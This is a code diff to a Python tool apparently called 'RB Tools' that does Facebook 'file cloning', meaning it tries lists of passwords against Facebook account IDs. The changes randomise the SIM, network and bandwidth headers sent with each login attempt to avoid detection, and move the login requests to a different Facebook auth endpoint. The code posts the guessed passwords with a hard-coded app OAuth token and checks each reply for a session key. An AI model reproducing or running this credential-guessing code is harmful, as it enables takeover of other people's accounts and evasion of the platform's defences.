@@ -61,7 +61,7 @@ logo = ("""\033[1;32m
  Facebook  : RB RAHUL CMD(RB Brand)
  Status    : Free
  Tool Type : File Cloning
- Version   : 6.5.5
+ Version   : 6.6.6
 ----------------------------------------------
  Note: Use Fligt Mode ON/OFf When Start CMD 
 \033[1;37m----------------------------------------------""")
@@ -159,7 +159,7 @@ def menu():
         #       chk()
                 x = ("sex")
                 if x == ("sex"):
-                        print(' [1] File cloning Menu\n [2] File Create Menu\n [3] Random Cloning\n [4] How to Use Rb Tools\n [5] Join Whatsapp Group\n [0] Exit menu')
+                        print(' [1] File cloning Menu\n [2] File Create Menu\n [3] Random Cloning(Not Working)\n [4] How to Use Rb Tools\n [5] Join Whatsapp Group\n [0] Exit menu')
                         linex()
                         xd=input(' Choose an option: ')
                         if xd in ['1','01']:
@@ -460,12 +460,12 @@ def api2(ids,names,passlist):
                                         "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                 head = {
                                         'content-type':'application/x-www-form-urlencoded',
-                                        'x-fb-sim-hni':'31061',
+                                        'x-fb-sim-hni':str(random.randint(2e4, 4e4)),
                                         'x-fb-connection-type':'unknown',
                                         'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                         'user-agent':ua_string,
-                                        'x-fb-net-hni':'28613',
-                                        'x-fb-connection-bandwidth':'29643048',
+                                        'x-fb-net-hni':str(random.randint(2e4, 4e4)),
+                                        'x-fb-connection-bandwidth':str(random.randint(2e7, 3e7)),
                                         'x-fb-connection-quality':'EXCELLENT',
                                         'x-fb-friendly-name':'authenticate',
                                         'accept-encoding':'gzip, deflate',
@@ -541,7 +541,7 @@ def api3(ids,names,passlist):
                                         'x-fb-friendly-name':'authenticate',
                                         'accept-encoding':'gzip, deflate',
                                         'x-fb-http-engine':     'Liger'}
-                                url = ' https://b-api.facebook.com/method/auth/login'
+                                url = ' https://b-graph.facebook.com/auth/login'
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
